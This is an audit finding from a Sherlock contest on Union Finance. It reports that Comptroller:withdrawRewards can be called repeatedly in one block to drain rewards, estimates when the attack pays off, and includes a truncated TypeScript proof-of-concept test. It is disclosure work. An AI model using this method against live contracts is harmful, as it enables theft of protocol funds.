# [H] `Comptroller:withdrawRewards` leaks rewards

## Summary
Severity: High
Chain: Smart contract
Component: 2022-10-union-finance
Published: 2022-11-04
Source: https://github.com/sherlock-audit/2022-10-union-finance-judging/issues/155
Type: sherlock-finding

## Details
Bahurum

high

# `Comptroller:withdrawRewards` leaks rewards

## Summary
`Comptroller:withdrawRewards` can be called multiple times in the same block, and each time gives to the sender the rewards corresponding to one block. This could be exploited profitably to drain rewards from the Comptroller. Profitability depends mostly on the market price of the `UnionToken`.

## Vulnerability Detail
`Comptroller:withdrawRewards` gives 1 block worth of rewards each time it is called repeatedly in the same block. If the reward rate is 0.0006% per block, and the maximum staked amount is 100 000 DAI, then 0.6 tokens are dripped each time the function is called. If ETH is at 1500 and gas is 5 gwei, and each call takes 75 000 gas, the gas cost of one call is 0.5 USD. The attack is profitable in this scenario with a price of UnionToken > 1 USD. Profitablity finally depends on max stake amount and UnionToken price.

 For a coded PoC, add the following tests after the test `"withdraw rewards from comptroller"` in `staking.ts`:

```typescript
        it("PoC: gets rewards in the same block as staking", async () => {
            // await roll(100);
            const rewards = await contracts.comptroller.calculateRewardsByBlocks(
                deployerAddress,
                contracts.dai.address,
                1
            );
            console.log("rewards to withdraw: ", rewards.toBigInt()); 
            const balanceBefore = await contracts.unionToken.balanceOf(deployerAddress);
            await contracts.userManager.withdrawRewards();
            const balanceAfter = await contracts.unionToken.balanceOf(deployerAddress);
            console.log("rewards withdrawn: ", (balanceAfter.sub(balanceBefore)).toBigInt()); 
            expect(balanceAfter.sub(balanceBefore).gt(BigInt(0)));
        });
        it("PoC: can withdraw rewards multiple times in the same block", async () => {
            await roll(100);
            const rewards = await contracts.comptroller.calculateRewardsByBlocks(
                deployerAddress,
                contracts.dai.address,
                1
            );
            console.log("rewards to withdraw: ", rewards.toBigInt()); 
            const balanceBefore = await contracts.unionToken.balanceOf(deployerAddress);
```

_Trimmed to 38 lines — full report: https://github.com/sherlock-audit/2022-10-union-finance-judging/issues/155_
